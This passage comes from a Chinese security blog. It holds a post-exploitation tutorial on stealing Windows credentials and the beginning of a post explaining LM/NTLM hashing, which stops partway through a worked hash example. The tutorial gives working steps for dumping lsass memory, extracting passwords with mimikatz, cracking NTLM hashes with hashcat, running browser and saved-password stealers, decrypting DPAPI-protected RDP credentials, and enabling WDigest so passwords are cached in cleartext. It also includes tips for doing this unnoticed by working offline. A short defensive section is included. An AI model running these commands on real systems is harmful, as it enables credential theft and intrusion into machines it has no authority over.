它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011105344474.png" alt="image-20231011105344474"></p><p><img src="/img/image-20231011105400352.png" alt="image-20231011105400352"></p><p>下载即可</p><p>3、使用PowerSploit 的Out-MiniDump模块，PowerSploit是一个基于 Powershell 的渗透工具包，可以选择创建 进程的完整内存转储。</p><p>地址  <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</a></p><p><img src="/img/image-20231011105807265.png" alt="image-20231011105807265"></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Process</span> <span class="hljs-variable">lsass</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011110452665.png" alt="image-20231011110452665"></p><p>4、comsvcs.dll，系统自带。</p><p>通过comsvcs.dll的导出函数MiniDump实现dump内存 </p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs profile">首先查看lsass.exe进程PID: tasklist | findstr lsass.exe <br><br>使用powershell导出 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 496 C:\lsass.dmp full<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011111319463.png" alt="image-20231011111319463"></p><p><img src="/img/image-20231011111311782.png" alt="image-20231011111311782"></p><h3 id="读取lsass-dmp文件"><a href="#读取lsass-dmp文件" class="headerlink" title="读取lsass.dmp文件"></a>读取lsass.dmp文件</h3><p>使用mimikatz读取lsass.dmp文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011112003437.png" alt="image-20231011112003437"></p><h2 id="5-使用Hashcat和在线工具破解NTLM-Hash"><a href="#5-使用Hashcat和在线工具破解NTLM-Hash" class="headerlink" title="5.使用Hashcat和在线工具破解NTLM Hash"></a>5.使用Hashcat和在线工具破解NTLM Hash</h2><h3 id="Hashcat介绍"><a href="#Hashcat介绍" class="headerlink" title="Hashcat介绍"></a>Hashcat介绍</h3><p>Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。</p><p>下载地址： <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a> </p><p>Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在 Windows下运行的</p><img src="/img/image-20231011113256689.png" alt="image-20231011113256689" style="zoom:80%;" /><h3 id="使用hashcat破解NTLM-Hash"><a href="#使用hashcat破解NTLM-Hash" class="headerlink" title="使用hashcat破解NTLM Hash"></a>使用hashcat破解NTLM Hash</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">1000</span> NTLM HASH 字典 ‐‐force<br>hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">1000</span> e45a314c664d40a227f9540121d1a29d dictTest<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span> <br>(笔记本上可能会出现问题 硬件原因)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011115113962.png" alt="image-20231011115113962"></p><h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><p><a href="https://hashes.com/zh/decrypt/hash">https://hashes.com/zh/decrypt/hash</a></p><p><a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p><a href="https://md5decrypt.net/en/#answer">https://md5decrypt.net/en/#answer</a></p><p><img src="/img/image-20231011115201403.png" alt="image-20231011115201403"></p><h2 id="6-浏览器、数据库等密码的抓取"><a href="#6-浏览器、数据库等密码的抓取" class="headerlink" title="6.浏览器、数据库等密码的抓取"></a>6.浏览器、数据库等密码的抓取</h2><h3 id="BrowserGhost浏览器抓取（不太好用）"><a href="#BrowserGhost浏览器抓取（不太好用）" class="headerlink" title="BrowserGhost浏览器抓取（不太好用）"></a>BrowserGhost浏览器抓取（不太好用）</h3><p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下： </p><p>实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集) </p><p>用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘) </p><p>可以解密chrome全版本密码(chrome80版本后加密方式变了) </p><p>Chrome已经可以获取login data、cookie、history、book了 </p><p>命令：BrowserGhost.exe</p><img src="/img/image-20231011144853082.png" alt="image-20231011144853082" style="zoom:80%;" /><h3 id="Sharp-HackBrowserData浏览器"><a href="#Sharp-HackBrowserData浏览器" class="headerlink" title="Sharp-HackBrowserData浏览器"></a>Sharp-HackBrowserData浏览器</h3><p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓 </p><p>命令：hack-browser-data-windows-64bit.exe</p><img src="/img/image-20231011165224088.png" alt="image-20231011165224088" style="zoom:80%;" /><p><img src="/img/image-20231011165210980.png" alt="image-20231011165210980"></p><h3 id="SharpDecryptPwd数据库"><a href="#SharpDecryptPwd数据库" class="headerlink" title="SharpDecryptPwd数据库"></a>SharpDecryptPwd数据库</h3><p>SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包括Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐TeamViewer<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐FileZilla<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐WinSCP<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐Xmangager ‐<span class="hljs-selector-tag">p</span> Session_Path<br></code></pre></td></tr></table></figure><img src="/img/image-20231011165354467.png" alt="image-20231011165354467" style="zoom:80%;" /><h3 id="LaZagne各类密码"><a href="#LaZagne各类密码" class="headerlink" title="LaZagne各类密码"></a>LaZagne各类密码</h3><p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算 法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。 </p><p>命令：laZagne.exe all</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br>laZagne<span class="hljs-selector-class">.exe</span> browsers<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐firefox<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oN<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oA ‐output C:\Users\test\Desktop<br>laZagne<span class="hljs-selector-class">.exe</span> ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐vv<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐quiet ‐oA<br></code></pre></td></tr></table></figure><h2 id="7-Windows其他类型抓取NTLM-HASH工具"><a href="#7-Windows其他类型抓取NTLM-HASH工具" class="headerlink" title="7.Windows其他类型抓取NTLM HASH工具"></a>7.Windows其他类型抓取NTLM HASH工具</h2><h3 id="getpassword"><a href="#getpassword" class="headerlink" title="getpassword"></a>getpassword</h3><p>打开GetPass工具所在的目录。打开命令行环境。运行64位程GetPassword。运行该程序后,即可获得明文密码</p><p><img src="/img/image-20231011170339851.png" alt="image-20231011170339851"></p><h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><p>在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash</p><p><img src="/img/image-20231011170639628.png" alt="image-20231011170639628"></p><h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><p>下载QuarksPwDump.exe,在命令行环境中输人 QuarksPwDump.exe –dump-hash-local 导出三个用户的NLMHash</p><p><img src="/img/image-20231011170850242.png" alt="image-20231011170850242"></p><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang中的 GET-PASSHashes.ps1可以可以获取hash</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span>‐<span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span>‐<span class="hljs-variable">PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011171055766.png" alt="image-20231011171055766"></p><h3 id="wce"><a href="#wce" class="headerlink" title="wce"></a>wce</h3><p>这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。这款工具也分为32位和 64位两个不同的版本：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">‐l 列出登录的会话和NTLM凭据（默认值）<br>‐s 修改当前登录会话的NTLM凭据 参数：<span class="hljs-tag">&lt;<span class="hljs-name">用户名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">域名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">LM哈希</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">NT哈希</span>&gt;</span><br>‐r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次<br>‐c 用一个特殊的NTML凭据运行一个新的会话 参数：<br>‐e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次<br>‐o 保存所有的输出到一个文件 参数:<span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span><br>‐i 指定一个LUID代替使用当前登录会话 参数:<br>‐d 从登录会话中删除NTLM凭据 参数:<br>‐a 使用地址 参数: <span class="hljs-tag">&lt;<span class="hljs-name">地址</span>&gt;</span><br>‐f 强制使用安全模式<br>‐g 生成LM和NT的哈希 参数<span class="hljs-tag">&lt;<span class="hljs-name">密码</span>&gt;</span><br>‐K 缓存kerberos票据到一个文件（unix和windows wce格式）<br>‐k 从一个文件中读取kerberos票据并插入到windows缓存中<br>‐w 通过摘要式认证缓存一个明文的密码<br>‐v 详细输出<br></code></pre></td></tr></table></figure><h2 id="8-Windows-RDP凭证抓取和密码破解"><a href="#8-Windows-RDP凭证抓取和密码破解" class="headerlink" title="8.Windows RDP凭证抓取和密码破解"></a>8.Windows RDP凭证抓取和密码破解</h2><h3 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h3><p>Credentials的解密是Windows系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解为密码），接下来我们就讲解RDP凭证的抓取和破解 </p><p>在我们点击保存密码后，Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">win+<span class="hljs-built_in">r</span>  mstsc  打开远程桌面连接<br></code></pre></td></tr></table></figure><img src="/img/image-20231011174133403.png" alt="image-20231011174133403" style="zoom:67%;" /><img src="/img/image-20231011201859928.png" alt="image-20231011201859928" style="zoom: 67%;" /><h3 id="凭证的查看"><a href="#凭证的查看" class="headerlink" title="凭证的查看"></a>凭证的查看</h3><p>查看凭证命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看mstsc的连接记录<br>cmdkey /list<br>查找本地的Credentials<br><span class="hljs-built_in">dir</span> /a %userprofile%\appdata\<span class="hljs-built_in">local</span>\microsoft\credentials\*<br></code></pre></td></tr></table></figure><img src="/img/image-20231011202011697.png" alt="image-20231011202011697" style="zoom:67%;" /><img src="/img/image-20231011202106061.png" alt="image-20231011202106061" style="zoom:67%;" /><p>F49CBB3FE896E7F0A076E3E20D6224BE</p><h3 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h3><p>1、使用mimikatz获取该文件的MasterKey的guid</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">mimikatz <span class="hljs-name">dpapi</span>::cred /<span class="hljs-name">in</span>:<span class="hljs-name">C</span>:\Users\Administrator\appdata\local\microsoft\credentials\F49CBB3FE896E7F0A076E3E20D6224BE<br></code></pre></td></tr></table></figure><p>以用于加密凭据文件F49CBB3FE896E7F0A076E3E20D6224BE的MasterKey的guid就是：{e6f05b31-8adb-4ae8-9951-91676a3e869c}，所以我们只要从内存中找到这个guid对应的MasterKey的值即可</p><p><img src="/img/image-20231011202807404.png" alt="image-20231011202807404"></p><p>guid：{e6f05b31-8adb-4ae8-9951-91676a3e869c}</p><p>2、找到内存中对应的MasterKey</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::dpapi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011202930916.png" alt="image-20231011202930916"></p><p>通过guid找到对应的masterkey：6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054</p><p>3、最后打开mimikatz通过MasterKey值去解密凭据文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dpapi::cred <span class="hljs-regexp">/in:凭据文件路径 /m</span>asterky:masterkey值<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz dpapi::cred<br>/in:C:\Users\Administrator\appdata\<span class="hljs-built_in">local</span>\microsoft\credentials\F49CBB3FE896E7F0A076E3E20D6224BE /masterkey:6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054<br></code></pre></td></tr></table></figure><img src="/img/image-20231011203443828.png" alt="image-20231011203443828" style="zoom:80%;" /><h3 id="离线破解-建议"><a href="#离线破解-建议" class="headerlink" title="离线破解(建议)"></a>离线破解(建议)</h3><p>由于我们不能保证我们的mimikatz是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目 的其实很简单，就是把目标的文件和内存下载回来，在vps或本机上进行mimikatz解密即可。</p><p>1、下载目标内存</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass1 导出lsass<br></code></pre></td></tr></table></figure><img src="/img/image-20231011204045521.png" alt="image-20231011204045521" style="zoom:67%;" /><p>2、下载目标的Credentials文件</p><img src="/img/image-20231011205234232.png" alt="image-20231011205234232" style="zoom:80%;" /><p>F49CBB3FE896E7F0A076E3E20D6224BE</p><p>3、用mimikatz载入dump回来的内存</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Sekurlsa::minidump lsass1.dump<br></code></pre></td></tr></table></figure><img src="/img/image-20231011205414273.png" alt="image-20231011205414273" style="zoom:80%;" /><p>4、获取Credentials的GUID</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">dpapi::cred /in:F49CBB3FE896E7F0A076E3E20D6224BE<br></code></pre></td></tr></table></figure><img src="/img/image-20231011205528272.png" alt="image-20231011205528272" style="zoom:67%;" /><p>{e6f05b31-8adb-4ae8-9951-91676a3e869c}</p><p>5、获取内存中所有的MasterKey</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::dpapi<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011205634989.png" alt="image-20231011205634989"></p><p>6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054</p><p>6、利用MasterKey解密</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dpapi::cred <span class="hljs-regexp">/in:F49CBB3FE896E7F0A076E3E20D6224BE /m</span>asterkey:<span class="hljs-number">6</span>e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054<br></code></pre></td></tr></table></figure><img src="/img/image-20231011205803451.png" alt="image-20231011205803451" style="zoom:80%;" /><h2 id="9-window2018-R2之后抓取密码的方式"><a href="#9-window2018-R2之后抓取密码的方式" class="headerlink" title="9.window2018-R2之后抓取密码的方式"></a>9.window2018-R2之后抓取密码的方式</h2><p>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。</p><p>攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug 提升为debug权限<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure><img src="/img/image-20231011211405458.png" alt="image-20231011211405458" style="zoom: 67%;" /><h3 id="修改注册表和锁屏"><a href="#修改注册表和锁屏" class="headerlink" title="修改注册表和锁屏"></a>修改注册表和锁屏</h3><p>修改注册表</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011212911096.png" alt="image-20231011212911096"></p><p>锁屏</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">rundll32.exe user32.dll,LockWorkStation 锁屏<br><br>query <span class="hljs-keyword">user</span> <span class="hljs-title">查询登录</span><br><span class="hljs-title">logoff</span> ID 下载<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231011212832369.png" alt="image-20231011212832369"></p><img src="/img/image-20231011213003231.png" alt="image-20231011213003231" style="zoom:67%;" /><p>抓取密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug 提升为debug权限<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure><img src="/img/image-20231011213350075.png" alt="image-20231011213350075" style="zoom:67%;" /><h2 id="10-windows密码抓取防范措施"><a href="#10-windows密码抓取防范措施" class="headerlink" title="10.windows密码抓取防范措施"></a>10.windows密码抓取防范措施</h2><h3 id="2012R2域控设置"><a href="#2012R2域控设置" class="headerlink" title="2012R2域控设置"></a>2012R2域控设置</h3><p>在windows server 2012 R2中，新增了一个Protected Users 安全组，将用户加入到该组，用户的明文密码就不会 被获取</p><p><img src="/img/image-20231011213450667.png" alt="image-20231011213450667"></p><h3 id="安装KB2871997"><a href="#安装KB2871997" class="headerlink" title="安装KB2871997"></a>安装KB2871997</h3><p>2014年，Microsoft发布了KB2871997补丁，它主要囊括了Windows 8.1和Windows Server 2012 R2中增强的安 全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止”哈希传递“的攻击方式，但其确实有助于是Windows 免受一些常见的攻击，例如：明文密码脱取、RDP凭据盗取、盗取本地Administrator账户进行横向移动。</p><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网-Windows认证</title>
    <link href="/2023/11/03/%E5%86%85%E7%BD%91-Windows%E8%AE%A4%E8%AF%81/"/>
    <url>/2023/11/03/%E5%86%85%E7%BD%91-Windows%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="windows认证"><a href="#windows认证" class="headerlink" title="windows认证"></a>windows认证</h1><h2 id="1-windows本地认证–NTML哈希和LM哈希"><a href="#1-windows本地认证–NTML哈希和LM哈希" class="headerlink" title="1.windows本地认证–NTML哈希和LM哈希"></a>1.windows本地认证–NTML哈希和LM哈希</h2><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><p>Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与SAM文件中的密码进行对比，如果相同，则认证成功</p><p>SAM文件是位于 %SystemRoot%\system32\config\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。</p><p><img src="/img/image-20231009144637224.png" alt="image-20231009144637224"></p><p><strong>windows本地认证流程：</strong></p><p><img src="/img/image-20231009144807369.png" alt="image-20231009144807369"></p><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给lsass进程，这个过程中会存一份明文密码<strong>，将明文密码加密成NTLM Hash，对SAM数据库进行比较认证</strong> </p><p>Windows Logon Process（即winlogon.exe）：是Windows NT用户登陆程序，用于管理用户登陆和退出 </p><p>LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略 </p><p><strong>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</strong></p><h3 id="LM和NTLM哈希"><a href="#LM和NTLM哈希" class="headerlink" title="LM和NTLM哈希"></a>LM和NTLM哈希</h3><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中,用户信息存储在ntds.dit中,加密后为散列值。 </p><p>Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在 Windows操作系统中,Hash的结构通常如下</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">username:RID:LM‐<span class="hljs-built_in">HASH</span>:NT‐<span class="hljs-built_in">HASH</span><br></code></pre></td></tr></table></figure><p><strong>LM Hash</strong>的全名为”LAN Manager Hash”,是微软为了提高 Windows操作系统的安全性而采用的散列加密算法,其本质是<strong>DES加密</strong>。尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从 Windows vista和 Windows Server2008版本开始, Windows操作系统默认禁用 LM Hash)。</p><p>LM Hash明文密码被限定在14位以内,也就是说,如果要停止使用 LM Hash,将用户的密码设置为14位以上即可。如果 LM Hash被禁用了, 攻击者通过工具抓取的 LM Hash通常为“ad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) </p><p><strong>NTLM Hash</strong>是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是<strong>基于MD4加密算</strong> username:RID:LM‐HASH:NT‐HASH 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方式均为 NTLM Hash </p><p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。</p><p><img src="/img/image-20231009150243938.png" alt="image-20231009150243938"></p><h3 id="LM-hash原理"><a href="#LM-hash原理" class="headerlink" title="LM hash原理"></a>LM hash原理</h3><p>1、将明文口令转换为其大写形式 假设这里以明文Admin@123为例，转换为大写格式为：ADMIN@123 </p><p>2、 将字符串大写后转换为16进制字符串转换后为 41 44 4D 49 4E 40 31 32 33 </p><p>3、密码不足14字节要求用0补全， 1Byte&#x3D;8bit,上面的16进制字符串共9个字节,还差5个字节 使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 </p><p>4、将上述编码分成2组7字节</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">41 </span><span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span> 第一组<br><span class="hljs-symbol">32 </span><span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 第二组<br></code></pre></td></tr></table></figure><p>5、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0，再转换成十六进制组成得到2组8字节的编码 </p><p>第一组：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">41</span> <span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span><br>转换为二进制：<span class="hljs-number">01000001010001000100110101001001010011100100000000110001</span><br>七个为一组末尾补<br><span class="hljs-number">01000000</span><br><span class="hljs-number">10100010</span><br><span class="hljs-number">00010010</span><br><span class="hljs-number">10101000</span><br><span class="hljs-number">10010100</span><br><span class="hljs-number">01110010</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">01100010</span><br>合并后为<span class="hljs-number">0100000010100010000100101010100010010100011100100000000001100010</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">40</span>A212A<span 